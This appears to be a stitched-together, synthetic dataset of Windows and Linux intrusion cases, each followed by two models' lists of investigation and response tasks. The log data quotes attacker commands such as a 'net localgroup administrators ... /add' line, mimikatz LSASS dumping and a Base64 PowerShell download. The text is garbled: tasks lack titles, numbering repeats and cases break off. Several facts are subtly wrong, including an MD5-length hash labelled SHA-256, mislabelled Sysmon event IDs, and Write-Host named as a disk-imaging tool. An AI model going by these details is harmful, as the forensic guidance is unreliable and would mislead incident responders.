Task #3
Title: Examine malicious DLL file path and contents
Description: Inspect the files C:\Users\Public\Temp\evil.dll and C:\Users\Public\Temp\update.ps1. Run static analysis and sandboxing to identify known malware signatures or code indicative of kernel‑level tampering. Verify that these paths are inconsistent with authorized deployment procedures.

Task #4
Title: Correlate scheduled task “UpdateNtDll” creation
Description: Review the Scheduled Tasks library for a task named “UpdateNtDll”. Verify its trigger (system startup), action (execution of evil.dll), owner (johnDoe), and creation timestamp (2026‑03‑07T01:00:00Z). Check for any other anomalous scheduled tasks created during the same period.

Task #5
Title: Review permission changes on ntoskrnl.dll
Description: Analyze Windows Security Event ID 4670 for details on the modification of ntoskrnl.dll permissions. Confirm that johnDoe was granted Full Control and assess whether this action aligns with legitimate administrative duties or indicates abuse of privilege.

Task #6
Title: Audit PowerShell script update.ps1
Description: Open the PowerShell Execution Log for 2026‑03‑07T14:22:58Z. Examine the contents of update.ps1 to verify that it performs malicious modification of ntoskrnl.dll and to identify any additional malicious payload delivery or persistence mechanisms.

Task #7
Title: Investigate outbound connection to malicious IP
Description: Detail the outbound TCP session from 10.0.0.5 to 203.0.113.45:443 established by evil.dll at 2026‑03‑07T14:23:02Z. Block the IP at firewall perimeter and monitor for further communications from any host to this address.

Task #8
Title: Inspect cmd.exe launch context
Description: Scrutinize the event where cmd.exe was launched from C:\Windows\system32 with non‑standard command line arguments. Verify its digital signature, parent process chain, and user context to rule out masquerading or signed executable tampering.

Task #9
Title: Enumerate privilege escalation attempts
Description: Search all relevant logs for evidence of johnDoe attempting to elevate privileges beyond standard administrative rights. Correlate these attempts with the time window of the ntoskrnl.dll modification to determine motive or justification.

Task #10
Title: Check memory for hidden kernel modules
Description: Conduct Windows memory forensic analysis on the affected host to detect hidden or unauthorized kernel‑space modules such as evil.dll. Use driver unsigned change audits and Driver Signature Enforcement logs to confirm malicious presence.

Task #11
Title: Cross‑check integrity of other critical system files
Description: Run integrity verification across a set of core system files (e.g., ntoskrnl.exe, winload.exe, ntkrnlmp.exe). Flag any files whose checksums deviate from known good values, indicating potential widespread kernel tampering.

Task #12
Title: Validate johnDoe’s authorization
Description: Review the security policy and actual permissions granted to ADMINISTRATOR\johnDoe. Ascertain whether this user should have been able to modify ntoskrnl.dll and whether the account is currently used or has history of malicious activity.

Task #13
Title: Scan registry for persistence evidence
Description: Inspect HKLM\SYSTEM\CurrentControlSet\Services and HKCU\Software\Microsoft\Windows\CurrentVersion\Run for entries referencing evil.dll or suspicious services. Look for signed driver references or anomalous start‑up values planted by the attacker.

Task #14
Title: Run YARA rules on malicious files
Description: Apply a suite of YARA signatures targeting known kernel‑patching malware and malicious DLL delivery mechanisms to evil.dll and update.ps1. Document any matches and generate new rules if novel patterns are uncovered.

Task #15
Title: Remediate affected system
Description: Restore the legitimate ntoskrnl.dll from backup or reinstall relevant OS components. Remove evil.dll, update.ps1, and the Scheduled Task “UpdateNtDll”. Verify that system functionality normalizes and that no residual persistence remains.

Task #16
Title: Perform correlation across incidents
Description: Use the SOAR platform to search other cases in the past 30 days for indications of kernel tampering, malicious DLL injection, or outbound traffic to 203.0.113.45. Identifying a broader pattern can point to an ongoing attack campaign.

Task #17
Title: Notify stakeholders and incident response lead
Description: Compile an incident summary detailing the timeline, affected asset, indicators of compromise, containment actions, and recommended remediation. Share this briefing with the SOC Lead, system administrators, and executive management for risk assessment.

Task #18

case_title: Exploitation attempt detected on web application via known CVE-2023-XXXX
case_description: IDS ModSecurity alert flagged malicious payload sent to /admin by IP 203.0.113.22 at 2026-03-10 03:12:07; Windows Security log (Event ID 4688) shows cmd.exe initiating PowerShell script at 03:13:05; PowerShell execution logs confirm Base64‑encoded download of evil.exe from 198.51.100.42; EDR telemetry records creation of evil.exe in C:\Users\admin\AppData\Local\Temp with SHA‑256 d41d8cd98f00b204e9800998ecf8427e; Antivirus quarantine identified file as Trojan:Win32/EvilCode; Outbound TCP flow to 198.51.100.33 port 443 observed from 10.2.4.19 during 03:15‑03:30 with encrypted payload; DNS query logs show host 10.2.4.19 resolving suspicious domain badexample.org; Security event logs indicate successful user admin login from IP 198.51.100.42 at 03:01:10.
model_a_tasks:
Task #1  
Title: Confirm ModSecurity alert corresponds to the known CVE‑2023‑XXXX exploit  
Description: Review the ModSecurity alert details, including the request URL, method, and payload, to verify that the flagged event matches the signature for CVE‑2023‑XXXX. Cross‑check the alert timestamp with other logs to confirm its authenticity and rule out false positives.  

Task #2  
Title: Retrieve full HTTP request/response for the /admin call from IP 203.0.113.22  
Description: Pull the web server logs and any NetFlow records for the time window around 03:12:07 to capture the complete request body, headers, and server response. This will help reconstruct the attack vector and determine whether the payload exploited a specific input field or configuration.  

Task #3  
Title: Correlate ModSecurity event with Windows Security Event ID 4688 for the PowerShell launch  
Description: Use the event time, process name (cmd.exe → powershell.exe), and originating user to link the ModSecurity alert to the Windows event. Verify that a single user session was involved, which may indicate persistence or credential theft.  

Task #4  
Title: Extract and decode the Base64‑encoded PowerShell payload from the process command line  
Description: Parse the command line from Event ID 4688 and decode the Base64 string to reveal the actual shell commands. Save the decoded script to a safe analysis folder for further disassembly.  

Task #5  
Title: Review decoded PowerShell script for download and execution logic  
Description: Identify the download URL (198.51.100.42) and any obfuscation or anti‑analysis code. Verify that the script uses PowerShell’s `WebClient` or `Invoke-WebRequest` to fetch `evil.exe` and that it launches the binary afterward.  

Task #6  
Title: Validate downloaded `evil.exe` against the reported SHA‑256 hash  
Description: Use a hash calculator to compute the SHA‑256 of `evil.exe` located at `C:\Users\admin\AppData\Local\Temp`. Compare it with `d41d8cd98f00b204e9800998ecf8427e` to confirm the file’s integrity and confirm it matches the AV quarantine signature.  

Task #7  
Title: Inspect persistence artifacts created by `evil.exe` in the host  
Description: Query EDR logs for registry keys, scheduled tasks, or service entries that reference `evil.exe`. Examine the Windows event logs for any “New Service” or “Scheduled Task” entries between 03:12:00 and 04:00:00 to determine if the malware attempts to survive reboots.  

Task #8  
Title: Capture and analyze the outbound C2 traffic from `10.2.4.19` to `198.51.100.33`  
Description: Pull packet captures or flow logs for the 03:15‑03:30 window on port 443. Inspect the TLS handshake details, certificate chain, and any encrypted payload to confirm that `10.2.4.19` is serving as a proxy or a second-stage downloader.  

Task #9  
Title: Investigate DNS queries for the suspicious domain `badexample.org`  
Description: Review DNS logs to identify the query from `10.2.4.19`, check the resolved IP addresses, and cross‑reference with threat intelligence. Verify whether `badexample.org` is known as a command‑and‑control domain or associated with other malware campaigns.  

Task #10  
Title: Audit the successful admin login from IP 198.51.100.42 at 03:01:10  
Description: Look up the admin account’s login history, IP reputation, and any anomalous activity around the time of login. Determine whether the admin credentials were compromised beforehand or if the login itself might be part of a credential‑replay attack.  

Task #11  
Title: Search for lateral movement or privilege escalation post‑infection  
Description: Correlate all recent process creation, SMB sessions, and network shares involving the compromised host. Use EDR and endpoint logs to identify whether `evil.exe` attempted to elevate privileges or propagate to other systems.  

Task #12  
Title: Verify patch status for CVE‑2023‑XXXX on the web application server  
Description: Compare the web server’s current version and patch level against the vendor’s security advisory. If the server is unpatched, document the risk exposure and coordinate with the infrastructure team for immediate remediation.  

Task #13

Description: Resolve badexample.org to IP addresses, perform reverse DNS lookups, and query threat intelligence feeds for historical activity. Examine hosting reports for malicious payloads, phishing site content, or known botnet command centers. Correlate findings with DNS queries from 10.2.4.19 to confirm its role in the attack chain.

Task #10

Description: In EDR telemetry, look for evidence of pass-the-hash, remote desktop sessions, SMB file shares accessed by admin accounts, and unfamiliar shell execution attempts. Cross-reference NetFlow records for concurrent high-volume traffic to potential backdoor targets. Identify if evil.exe spawned child processes or encoded commands indicative of lateral spread.

Task #11

Description: Audit the application identified by ModSecurity at 203.0.113.22 to confirm if the vulnerability covered by CVE-2023-XXXX has been patched. Check configuration management databases for current software versions, apply missing security updates, and adjust ModSecurity rules or WAF policies to block future exploitation attempts.

Task #12

Description: Use NetFlow and packet captures to identify large outbound transfers initiated by compromised hosts during the event window. Map affected files or database queries, correlate with user account activity, and estimate data volume moved to external IPs. Prioritize remediation on hosts handling sensitive data.

Task #13
Title: Augment IOC list and perform cross-correlations
Description: Compile newly discovered IPs (203.0.113.22, 198.51.100.42, 10.2.4.19, 198.51.100.33), domain (badexample.org), and file hash (d41d8cd98f00b204e9800998ecf8427e). Cross-check these IOCs against proprietary threat intel, open-source feeds, firewall logs, and other SOC alerts to uncover additional compromised entities or related attack campaigns.

Task #14
Title: Contain infected assets and recover admin accounts
Description: Isolate host 10.2.4.19 from the network pending full forensic analysis. Remove all malicious artifacts, including evil.exe and any persistence mechanisms discovered. Reset passwords for compromised admin accounts, enforce multi‑factor authentication, and monitor for failed login attempts. Ensure all affected systems receive up‑to‑date antivirus signatures and host-based detection rules.

Task #15
Title: Conduct root cause analysis and update SOAR playbooks
Description: Summarize the attack vector chain, identify configuration weaknesses (e.g., inadequate Web Application Firewall tuning, unsecured PowerShell execution policies, missing audit trails). Update SOAR playbooks to automate these forensic tasks in future incidents, strengthen validation of ModSecurity alerts, and reinforce patch management processes. Document lessons learned and recommendations for security controls improvement.

Task #16
Title: Release threat intelligence feed with new IOCs
Description: Compile comprehensive IOC set from this incident, including IP addresses, domain names, file hashes, and malicious PowerShell commands. Submit to internal and external threat intel sharing platforms to aid broader community defense efforts. Ensure SOAR integration ingests these IOCs for automated blocking and alert correlation.

case_title: Unexpected modifications to critical system files and registry settings during off‑hours indicate a potential intrusion
case_description:
- File: C:\Windows\System32\GroupPolicy\User\Registry.pol, LastModified: 2024‑03‑10 01:35:12 UTC, PreviousHash: 7f6c5a49e2..., NewHash: b12d3e78c4..., Owner: SYSTEM, Process: sc.exe (PID 6732), EventID: 4663  
- File: C:\Windows\System32\drivers\wdm.sys, LastModified: 2024‑03‑10 01:50:24 UTC, PreviousHash: 1a2b3c4d..., NewHash: 5f6e7d8c..., Owner: SYSTEM, Process: sc.exe (PID 6732), EventID: 4663  
- File: /etc/passwd, LastModified: 2024‑03‑09 23:45:00 UTC, Changes: added user 'attacker', Process: sshd (PID 1624)  
- File: /etc/ssh/sshd_config, LastModified: 2024‑03‑10 02:00:57 UTC, Changes: PermitRootLogin yes, Process: sshd (PID 1624)  
- File: /Applications/BadApp.app/Contents/Info.plist, LastModified: 2024‑03‑10 01:20:55 UTC, NewContent: <URL>malicious.example.com</URL>, Process: launchd (PID 1)  
- Process: rdpinput.exe (PID 3498) launched by user user123 at 01:18:05 UTC, CommandLine: sc config Spooler start= auto && sc start Spooler  
- Process: sc.exe (PID 6732) executed to restart spooler service at 01:50:24 UTC  
- Network: Outbound connection from 192.168.1.42 to 10.45.23.1:443 at 01:30:12 UTC, TLS handshake with unknown Certificate Authority  
- Log Event: 4670 permission change on C:\ProgramData\Database\config.db, NewOwner: SYSTEM, Time: 01:25:00 UTC  
- File created: C:\Users\Public\Documents\malware.exe, CreationTime: 2024‑03‑10 02:00:01 UTC, SHA256: 7a9c3b55f...
model_a_tasks:

Task #2

Description: Compare the new hash values against known-good OS baselines or snapshots to detect tampering. Use OS image verification tools or hash databases to confirm whether the files have been altered maliciously.

case_title: Detected attempted privilege escalation via LSASS memory disclosure on Windows Server 2016.
case_description:
- Windows Security Log event ID 4624: successful logon by user “attacker_local” on host “WIN‑SRV2016” from IP 10.0.0.15 via Kerberos.  
- Sysmon event ID 11: new process “cmd.exe” launched with command line “/c net localgroup administrators tempadmin /add”.  
- Windows Security Log event ID 4720: creation of local user “tempadmin” by “attacker_local”.  
- PowerShell script “invoke‑mimikatz.ps1” executed by “attacker_local” to dump LSASS credentials at 01:50:32 UTC.  
- Extraction of NTLM password hash from LSASS memory via mimikatz.  
- Creation of scheduled task “PrivEscTask” to run “C:\temp\elevate.ps1” every few minutes under the SYSTEM account.  
- Modification of ACL on “C:\Windows\system32\notepad.exe” to grant full control to “tempadmin”.  
- Process “services.exe” spawned as SYSTEM to create a new service “privsvc” with binary path “C:\Windows\Temp\privsvc.exe”.  
- RDP session established from external IP 203.0.113.10 to “WIN‑SRV2016” on port 3389 at 02:05:12 UTC by “tempadmin”.  
- Sysmon event ID 10: new network connection from “WIN‑SRV2016” to external IP 192.168.1.100:4444 generated by “privsvc.exe”.  
- Modification of registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinRM\Parameters\AllowRemoteShell to value “1” by “tempadmin”.  
- Unusual DNS queries for “malicious-domain.tld” from host “WIN‑SRV2016” observed at 02:15:23 UTC.
model_a_tasks:
Task #1  
Title: Validate the legitimacy of attacker_local and source IP  
Description: Verify whether the user “attacker_local” exists in the domain or was created recently. Check the source IP 10.0.0.15 against asset inventory and known IP ranges. Review any preceding events that may indicate compromise of this account.

Task #2  
Title: Correlate the successful Kerberos logon with subsequent activity  
Description: Align the Event ID 4624 for “attacker_local” with the timestamps of the command-line, Service creation, and scheduled task events. Ensure a continuous chain of actions proceeds from logon to privilege escalation.

Task #3  
Title: Examine creation of local user tempadmin  
Description: Confirm the creation event (Event ID 4720) details—who created it, when, and if it matches the attacker_local session. Inspect tempadmin account properties: password age, default shell, and membership flags.

Task #4  
Title: Verify tempadmin addition to administrators group  
Description: Re‑run the command “net localgroup administrators tempadmin” to verify membership. Review Windows Security logs for any audit of this group change and confirm no other unauthorized modifications.

Task #5  
Title: Locate and analyse the PowerShell script invoke‑mimikatz.ps1  
Description: Search the filesystem and Event logs for the script’s path. Review its content for execution of LSASS memory dump and hash extraction. Check for obfuscation or anti‑analysis techniques.

Task #6  
Title: Investigate LSASS memory dump and extracted NtLM hash  
Description: Confirm that the script executed successfully via Sysmon or PowerShell logs. Trace the hash extraction time and source memory region. Compare the extracted hash against stored local account passwords to determine if it was used for credential theft.

Task #7  
Title: Review scheduled task “PrivEscTask” under SYSTEM account  
Description: Inspect the task’s configuration (Task Scheduler or WMI). Verify the script path C:\temp\elevate.ps1, trigger schedule, and rights. Determine whether the task provides persistence and what it executes each run.

Task #8  
Title: Inspect creation of service “privsvc” and its binary  
Description: Verify the service’s registry entries under HKLM\SYSTEM\CurrentControlSet\Services\privsvc. Locate the binary C:\Windows\Temp\privsvc.exe, verify its checksum, and compare to known malware samples. Identify the service’s RunAs owner and startup type.

Task #9  
Title: Verify ACL alteration on notepad.exe by tempadmin  
Description: Retrieve the ACL of C:\Windows\system32\notepad.exe before and after the event. Confirm the added permissions grant full control to tempadmin. Ascertain whether the change was performed legitimately or as part of exploitation.

Task #10  
Title: Confirm RDP session from external IP 203.0.113.10 by tempadmin  
Description: Analyze RDP logs for Session ID, authentication method, and any failed attempts. Verify that tempadmin was used as the login account. Examine any RDP client certificates or credentials used.

Task #11  
Title: Examine outbound connection to 192.168.1.100:4444 from privsvc.exe  
Description: Correlate Sysmon event ID 10 with the binary’s activity. Capture packet traces if available. Determine if the traffic is a beacon to a C2 server or part of a legitimate service.

Task #12  
Title: Review WinRM registry modification for remote shell capability  
Description: Check the time of modification of HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinRM\Parameters\AllowRemoteShell. Confirm the new value is “1” and that it grants remote shell access. Check if any remote shell execution followed afterward.

Task #13  
Title: Investigate DNS queries for malicious-domain.tld  
Description: Search DNS logs for queries on “malicious-domain.tld” originating from WIN‑SRV2016. Correlate timestamps with other suspicious events. Validate if the domain resolves to known malicious IPs or an unknown host.

Task #14  
Title: Construct a comprehensive timeline of attacker activity  
Description: Aggregate all event timestamps (logon, user creation, script execution, service creation, scheduled task, RDP, network connections, DNS). Build a chronological sequence to confirm the attacker’s path and identify potential gaps.

Task #15  
Title: Initiate containment by disabling attacker_local and tempadmin  
Description: Temporarily lock out both accounts on the host and in Active Directory. Remove tempadmin from administrators group and delete the account if no legitimate need exists. Apply a temporary block on new logons from 10.0.0.15.

Task #16  
Title: Disable and remove persistence artifacts (PrivEscTask, privsvc)  
Description: Delete the scheduled task “PrivEscTask” and the service “privsvc”. Delete the binaries elevate.ps1 and privsvc.exe. Reset any registry keys created for these artifacts.

Task #17  
Title: Acquire forensic evidence of the host  
Description: Create a forensic disk image of WIN‑SRV2016, preserve all logs, and capture current memory to verify the presence of hidden processes. Archive Sysmon, Security, and Application logs for further analysis.

Task #18  
Title: Investigate potential lateral movement to other hosts  
Description: Search event logs for additional RDP sessions or SMB traffic originating from WIN‑SRV2016. Inspect for propagation of malicious binaries or credentials to other servers or workstations.

Task #19  
Title: Check for EDR or antivirus detections of mimikatz and other artifacts  
Description: Query EDR/AV telemetry for signatures or heuristics matching mimikatz, elevate.ps1, privsvc.exe. Confirm if any detections were suppressed and review alert logs for overlooked events.

Task #20  
Title: Analyze exfiltration risk of stolen credentials  
Description: Inspect outbound traffic for evidence of hash or credential exfiltration. Verify whether stolen NTLM hashes were sent to 192.168.1.100 or any external IP. Determine if a secondary credential theft or pass‑the‑hash attack is ongoing.

Task #21  
Title: Review host for additional malicious indicators  
Description: Run malware scans against known IOC lists, check for hidden scheduled tasks, services, or persistence mechanisms. Scan for rootkits or kernel-level exploits that may have been introduced.

Task #22  
Title: Document findings and recommend remediation actions  
Description: Compile a report summarizing evidence, timeline, and evidence of compromise. Suggest remediation: password resets, patching, hardening of WinRM, revoke unneeded services, and potentially conduct NOC coverage. Provide guidance for future detection improvements.
model_b_tasks:
Task #1
Title: Verify integrity of collected security logs
Description: Check hash values of the Windows Security Log (Event ID 4624, 4720) and Sysmon logs (ID 10, 11) to ensure they have not been tampered with. Validate timestamps, source IDs, and sequence numbers against expected values for the host “WIN‑SRV2016”. Confirm that log entries correlated to the attack timeline are intact.

Task #2
Title: Correlate attacker_local logon and privilege‑adding actions
Description: Align Event ID 4624 (successful Kerberos logon by “attacker_local”) with Sysmon ID 11 (cmd.exe launch with “net localgroup administrators tempadmin /add”) to reconstruct the chain of events. Verify command‑line arguments, process tree, and timestamps to confirm that privilege escalation was performed by the same user session.

Task #3
Title: Analyze LSASS memory dump obtained by mimikatz
Description: Retrieve the memory snapshot referenced by the PowerShell script “invoke‑mimikatz.ps1”. Run Volatility/Immunity Canvas or other memory forensic tools to confirm that LSASS memory was dumped and to extract credential material. Cross‑check extracted NTLM hashes against the corporate hash database and threat‑intel feeds for known compromises.

Task #4
Title: Enumerate persistence via scheduled task PrivEscTask
Description: Query task scheduling system (Schtasks /query /TN "PrivEscTask") to capture run-as account, trigger settings, and command line (“C:\temp\elevate.ps1”). Review Sysmon ID 10 (new network connection) and ID 12 (process creation) events for evidence of task execution. Determine whether the task ran as part of the privilege‑escalation chain.

Task #5
Title: Dissect elevate.ps1 script for persistence and exfiltration behavior
Description: Pull the full script content from “C:\temp\elevate.ps1”. Analyze PowerShell commands, obfuscation techniques, and network calls. Identify if it contains hard‑coded URLs, connects back to 192.168.1.100:4444, or launches additional malicious processes. Flag any code that writes to disk or modifies registry for persistence.

Task #6
Title: Identify and analyze privsvc.exe service binary
Description: Locate “C:\Windows\Temp\privsvc.exe” on the host. Compute its SHA‑256 hash and compare against known legitimate binaries. Perform static analysis with PE viewers and dynamic sandboxing to uncover embedded C&C communication, service start parameters, and privilege use. Confirm it was created by “services.exe” under the SYSTEM account.

Task #7
Title: Validate ACL modification on system file notepad.exe
Description: Audit ACL entries on “C:\Windows\system32\notepad.exe” to confirm that FULL CONTROL was granted to “tempadmin” and no other privileged accounts. Check for accompanying file integrity monitoring alerts. Investigate whether similar permissions changes exist on other critical binaries.

Task #8
Title: Confirm creation and group membership of tempadmin user
Description: Query local user database to retrieve properties of “tempadmin” (SID, password last set, expiration). Verify that it resides in the “Administrators” group and is not a default or legacy account. Determine whether tempadmin’s credentials were used for any external connections, such as the RDP session.

Task #9
Title: Assess significance of RDP session from external IP 203.0.113.10
Description: Perform IP reputation lookup on 203.0.113.10. Check RDP authentication logs and session details for anomalous patterns (e.g., unusual credentials, start time, duration). Capture RDP traffic if available and analyze for potential keylogging or credential dumping activity. Evaluate whether the session was legitimate (e.g., vendor support) or malicious.

Task #10
Title: Investigate outbound connection from privsvc.exe to 192.168.1.100:4444
Description: Retrieve firewall logs, Sysmon ID 10 entries, and packet captures for traffic originating from “WIN‑SRV2016” to 192.168.1.100 on port 4444. Identify if privsvc.exe was the initiator and whether protocol or payload content suggests a command‑and‑control session. Attempt to resolve the IP to any known malicious infrastructure.

Task #11
Title: Examine WinRM configuration change and potential remote exploitation
Description: Read the registry key HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinRM\Parameters\AllowRemoteShell to confirm change to “1” by tempadmin. Review WinRM listener configurations (WSMAN listeners) and enabled authentication methods. Determine if remote management exposure was opened inadvertently and assess who can now invoke WinRM commands on the host.

Task #12
Title: Scrutinize DNS queries for malicious-domain.tld
Description: Collect DNS logs, purge cache entries, and perform deep packet inspection for queries to “malicious-domain.tld” from “WIN‑SRV2016” at 02:15:23 UTC. Conduct WHOIS and reverse DNS analysis on the domain owner and resolved IP addresses. Cross‑reference with threat‑intel sources for malicious activity associated with the domain.

Task #13
Title: Map observed indicators to MITRE ATT&CK tactics and techniques
Description: Create a comprehensive mapping document linking detected behaviors to ATT&CK IDs (e.g., Credential Dumping: LSASS Memory T1003.001, Persistence: Scheduled Task T1053.005, Service Creation T1050). Use this mapping to trigger appropriate SOAR playbooks and to inform incident response strategy.

Task #14
Title: Isolate host and preserve volatile evidence
Description: Immediately isolate “WIN‑SRV2016” from internal and external networks via firewall rule or VLAN cut. Perform live‑memory acquisition using DumpIt or similar tool before the attacker closes the session or clears dumps. Create a forensic image of all disk partitions using Write-Host or FTK Imager. Store collected evidence in a locked, write‑protected repository and begin triage for containment and eradication.

case_title: Unexpected critical system file modifications detected during nightly log review
case_description: Windows Event ID 4663: File modification on C:\Windows\System32\drivers\etc\hosts by user jsmith, timestamp 2026-03-10T02:37:12Z, new hash EFA76B3C; Sysmon ProcessCreate for C:\Temp\modSecurity.exe, PID 1592, initiated by jsmith at 02:35:21; Linux audit rule 22: Modification of /etc/passwd by root, timestamp 2026-03-10T02:40:08, new hash 9F3A0C12D4E7; Cron job at 01:55 on server1 triggered /usr/bin/rsync to backup /home/jsmith to external host, logged in /var/log/cron; HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run entry 'UninstallLauncher' pointing to C:\Temp\del.exe added by user jsmith at 02:30:45; Sysmon ProcessImageLoad for C:\Windows\Temp\t696464786.exe by jsmith at 02:30:09; Multiple failed login attempts from 203.0.113.42 to administrator between 01:55 and 03:05; File timestamp on C:\Windows\system32\drivers\etc\hosts changed from 2023-06-12 to 2026-03-10; Unrecognized network traffic from internal host 10.1.2.5 to 224.0.0.22:5353 (mDNS) at 02:45:30; Unexpected file creation/overwrites in C:\Users\Public\Documents at 02:42:17; File system watcher alerts on /opt/app/config.yaml changes during off‑hours.
model_a_tasks:
Task #1  
Title: Create Cross‑Platform Event Timeline  
Description: Gather all relevant Windows Event IDs 4663, Sysmon ProcessCreate/ProcessImageLoad logs, and Linux audit logs; align them to a single time zone; build a chronological sequence of events to identify the order of suspicious activity.

Task #2  
Title: Validate Integrity of Critical System Files  
Description: Compare current hashes of C:\Windows\System32\drivers\etc\hosts and /etc/passwd against known good baselines; verify timestamps; flag and investigate any unauthorized changes.

Task #3  
Title: Retrieve and Analyze Suspicious Executable Hashes  
Description: Extract file hashes for modSecurity.exe, del.exe, and t696464786.exe; cross‑check against threat intelligence feeds and internal malware signatures; determine if they match known malicious binaries.

Task #4  
Title: Investigate Persistence Mechanisms  
Description: Review the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run entry and the server1 cron job; validate the owner, execution context, and legitimacy; confirm whether these provide persistence.

Task #5  
Title: Examine Detailed Process Creation and Image Load Records  
Description: Drill into Sysmon ProcessCreate and ProcessImageLoad events to identify parent processes, command‑line arguments, and network sockets; map any suspicious chain of execution and command usage.

Task #6  
Title: Analyze Network Activity Around Suspicious IPs  
Description: Inspect netflow, firewall, and DNS logs for connections involving 203.0.113.42 and mDNS traffic to 224.0.0.22:5353; assess whether data exfiltration, reconnaissance, or lateral movement is occurring.

Task #7  
Title: Assess User Account Activity and Privileges  
Description: Review jsmith’s account history, group memberships, and failed login attempts; verify if credentials were compromised and whether elevated privileges were abused during the modifications.

Task #8  
Title: Perform Malware Scanning on Suspect Binaries  
Description: Run endpoint detection tools on modSecurity.exe, del.exe, t696464786.exe, and any newly created files; compare results to sandbox analysis; document detections or false positives.

Task #9  
Title: Audit for Additional Unauthorized System File Changes  
Description: Search Windows and Linux audit logs for modifications to other sensitive files and ownership changes (e.g., /etc/shadow, /etc/group, registry hives); compile a comprehensive list of affected items.

Task #10  
Title: Isolate Affected Hosts and Preserve Evidence  
Description: Quarantine impacted machines; capture volatile memory dumps and disk images; forward logs and forensic artifacts to the analysis team for deeper investigation.

Task #11  
Title: Review Off‑Hour File System Watcher Alerts  
Description: Investigate all alerts on C:\Users\Public\Documents and /opt/app/config.yaml; confirm whether changes align with scheduled backups or represent unauthorized modifications.

Task #12  
Title: Recommend Remediation and Future Hardening  
Description: Summarize findings, propose removal of malicious persistence points, revert altered files, patch vulnerabilities, enforce least privilege, and update monitoring rules to detect similar events in the future.
model_b_tasks:
Task #1  
Title: Verify integrity of modified hosts file on Windows system.  
Description: Compare the contents of C:\Windows\System32\drivers\etc\hosts to a known‑good baseline (e.g., from daily snapshots or OS image). Generate a SHA‑256 hash of the current file and cross‑check against the hash of a legitimate OS installation. Flag any unexpected IP/hostname mappings that could indicate malicious redirection or tampering.

Task #2  
Title: Perform static and dynamic analysis on modSecurity.exe dropper.  
Description: Locate the modSecurity.exe binary in C:\Temp, compute its hash, and query malicious IOC databases such as VirusTotal, MISP, and hybrid analysis. If flagged, conduct sandbox execution to observe actions (file writes, registry keys, network connections). Document payload delivery mechanisms, encryption usage, or attempts to bypass EDR controls.

Task #3  
Title: Investigate execution and behavior of t696464786.exe loader.  
Description: Correlate the Sysmon ProcessImageLoad event at 02:30:09 with any ProcessCreate entries in the same timeframe. Retrieve t696464786.exe from C:\Windows\Temp, compute its hash, and perform static code analysis for known malicious patterns. In a controlled environment, execute the file to monitor DLL loading, registry modifications, and any self‑deletion or cleanup behavior.

Task #4  
Title: Analyze persistence via HKLM Run key entry “UninstallLauncher”.  
Description: Inspect the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run for the UninstallLauncher entry pointing to C:\Temp\del.exe. Verify the integrity of del.exe by hashing and IOC lookup. Determine if the entry loads on system boot, if del.exe performs destructive actions (e.g., deleting system files), or if it sets up further persistence mechanisms such as scheduled tasks.

Task #5

Description: Search Windows Security logs for User Account Control events, event 4663 file modification, event 4688 ProcessCreate, and event 4645 Account lockout occurrences around 02:00‑04:00. Identify any privilege escalation attempts, suspicious PowerShell or command‑line activity, and unauthorized software execution. Contact the user to verify legitimacy; if anomalies remain, consider temporary account lockout pending further investigation.

Task #6  
Title: Correlate Windows jsmith activity with Linux root events.  
Description: Examine Linux audit logs (avahi logs, /var/log/auth.log) for any sudo sessions, su commands, or direct root logins by jsmith or other compromised accounts between 01:55‑02:50. Confirm if the same jsmith appears in Linux logs, indicating lateral movement or credential reuse. Investigate any evidence of password cracking, credential dumping, or SSH key planting.

Task #7  
Title: Inspect modification of /etc/passwd on Linux server.  
Description: Compare the new hash 9F3A0C12D4E7 of /etc/passwd to a baseline snapshot. Identify added, altered, or deleted user entries, focusing on UID ranges, groups, login shells, and password encryption. Cross‑reference with ACL changes and sudoers modifications to assess potential privilege escalation or persistence opportunities introduced by the attack.

Task #8  
Title: Analyze rsync cron job backup activity to external host.  
Description: Review crontab entries at 01:55 for rsync commands on server1, noting destination IP and authentication method (SSH key, password). Verify firewall logs for outbound connections to the destination during the scheduled window. If the destination is external and unauthorized, flag potential data exfiltration. Examine rsync logs and destination host for transferred data and associated timestamps.

Task #9  
Title: Investigate internal host 10.1.2.5 mDNS traffic to 224.0.0.22:5353.

case_title: Unusual network scanning activity detected on corporate perimeter
case_description:
- Firewall logs record 3,840 TCP SYN packets from source IP 203.0.113.45 targeting ports 1-1000 across a 4‑minute interval, with a peak of 950 SYNs per minute.  
- Snort IDS generated Alert ID 1407 (port scan) for the same source IP, indicating repeated half‑open connections.  
- NetFlow data shows 5,600 outbound flows from 203.0.113.45, all directed to destination ports above 1024, with an average flow duration of 0.7 seconds.  
- Endpoint security logs on host WM1-01 report three denied inbound connections to port 445, matching the scanning pattern.  
- No corresponding authentication events or user activity were linked to 203.0.113.45, leaving the origin and intent uncertain.
model_a_tasks:
Task #1  
Title: Determine the Origin and Reputation of Source IP 203.0.113.45  
Description: Use external threat‑intel services (e.g., AbuseIPDB, VirusTotal, and Shodan) to query the IP for past malicious activity, known botnet association, or scanning footprints. Perform reverse‑DNS lookup, WHOIS lookup, and geolocation to confirm whether the address is a legitimate provider or a known malicious entity. Cross‑validate these findings against the internal asset registry to rule out mis‑attribution or routing anomalies.

Task #2  
Title: Verify IP Scope: External vs. Internal Address  
Description: Confirm whether 203.0.113.45 is a truly public address or if it is behind a NAT/proxy that maps to an internal host. Retrieve router or firewall NAT tables, check mapping logs for the IP during the scan window, and consult the organization’s IP allocation policy. This ensures we do not falsely flag internal traffic as external reconnaissance.

Task #3  
Title: Correlate IP Activity with Historical Footprints  
Description: Search the SIEM and log archives for any prior events linked to 203.0.113.45 (e.g., historical port scans, lateral movement attempts, or credential brute‑force failures). Align timestamps from the firewalls, IDS, and NetFlow DAG to build a timeline. Identify any recurring patterns that could indicate a persistent adversary or automated scanner design.

Task #4  
Title: Perform Detailed Firewall Log Analysis for Anomalies  
Description: Isolate firewall logs for the 4‑minute window of the scan, focusing on ingress/egress rule hits, SYN‑rate‑limit triggers, and packet drops. Map each SYN packet to the corresponding IDS alert to confirm alert accuracy. Note any unusual flag patterns or duplicate packets that may have been missed by the firewall.

Task #5  
Title: Expand NetFlow Analysis for TTP Identification  
